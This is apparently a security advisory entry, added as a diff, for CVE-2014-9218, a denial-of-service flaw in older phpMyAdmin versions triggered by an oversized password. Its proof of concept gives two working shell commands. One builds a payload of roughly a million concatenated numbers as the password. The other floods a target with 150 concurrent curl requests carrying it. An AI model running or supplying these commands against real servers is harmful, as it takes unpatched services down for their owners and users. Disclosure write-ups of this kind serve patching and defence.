@@ -1,0 +1,42 @@
+=============
+DESCRIPTION:
+=============
+A vulnerability present in in phpMyAdmin 4.0.x before 4.0.10.7, 4.1. x
+before 4.1.14.8, and 4.2.x before 4.2.13.1 allows remote attackers  to
+cause a denial of service (resource consumption) via a long password.
+CVE-2014-9218 was assigned
+
+=============
+Time Line:
+=============
+December 3, 2014 - A phpMyAdmin update and the security advisory is
+published.
+
+=============
+Proof of Concept:
+=============
+
+*1 - Create the payload.*
+
+$ echo -n "pma_username=xxxxxxxx&pma_password=" > payload && printf "%s"
+{1..1000000} >> payload
+
+*2 - Performing the Denial of Service attack.*
+
+$ for i in `seq 1 150`; do (curl --data @payload
+http://your-webserver-installation/phpmyadmin/ --silent > /dev/null &) done
+
+=============
+Authors:
+=============
+
+-- Javer Nieto -- http://www.behindthefirewalls.com
+-- Andres Rojas -- http://www.devconsole.info
+=============
+
+References:
+====================================================================
+
+*
+http://www.behindthefirewalls.com/2014/12/when-cookies-lead-to-dos-in-phpmyadmin.html
+* http://www.phpmyadmin.net/home_page/security/PMASA-2014-17.php
